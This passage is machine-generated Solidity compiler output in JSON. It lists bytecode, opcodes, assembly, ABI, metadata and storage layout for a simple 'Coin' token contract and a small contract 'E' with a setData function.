							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c8063075461721461003b57806327e235e314610085575b600080fd5b6100436100dd565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100c76004803603602081101561009b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610102565b6040518082815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6001602052806000526040600020600091509050548156fea26469706673582212200e14796961973e630439d54f5d8bcb7ede96b9ef0acdbf57d741af6b4522575764736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7546172 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x85 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0xDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC7 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x102 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE EQ PUSH26 0x6961973E630439D54F5D8BCB7EDE96B9EF0ACDBF57D741AF6B45 0x22 JUMPI JUMPI PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "787:1785:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;787:1785:4;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;1207:21:4;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1235:41;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;1235:41:4;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;1207:21;;;;;;;;;;;;;:::o;1235:41::-;;;;;;;;;;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "67200",
								"executionCost": "117",
								"totalCost": "67317"
							},
							"external": {
								"balances(address)": "1169",
								"minter()": "1031"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 787,
									"end": 2572,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 787,
									"end": 2572,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212200e14796961973e630439d54f5d8bcb7ede96b9ef0acdbf57d741af6b4522575764736f6c63430006060033",
									".code": [
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH",
											"source": 4,
											"value": "7546172"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH",
											"source": 4,
											"value": "27E235E3"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 787,
											"end": 2572,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "tag",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "RETURN",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "8"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "8"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "9"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "tag",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "RETURN",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "tag",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "100"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "EXP",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "DIV",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1207,
											"end": 1228,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "tag",
											"source": 4,
											"value": "9"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "KECCAK256",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1235,
											"end": 1276,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"balances(address)": "27e235e3",
							"minter()": "07546172"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Sent\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"Coin\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 1749,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:Coin",
								"label": "minter",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 1753,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:Coin",
								"label": "balances",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"E": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "a",
									"type": "uint256"
								}
							],
							"name": "setData",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5b4b73a9\n      eq\n      tag_3\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_5\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_5:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_6\n      jump\t// in\n    tag_4:\n      stop\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3195:3196  a */\n      dup1\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3188:3192  data */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3188:3196  data = a */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206f01b955fa7570c8c07b6b1d1793ef917228618d51d525f46a86a7d52fe57bbd64736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b5060988061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80635b4b73a914602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b806000819055505056fea26469706673582212206f01b955fa7570c8c07b6b1d1793ef917228618d51d525f46a86a7d52fe57bbd64736f6c63430006060033",
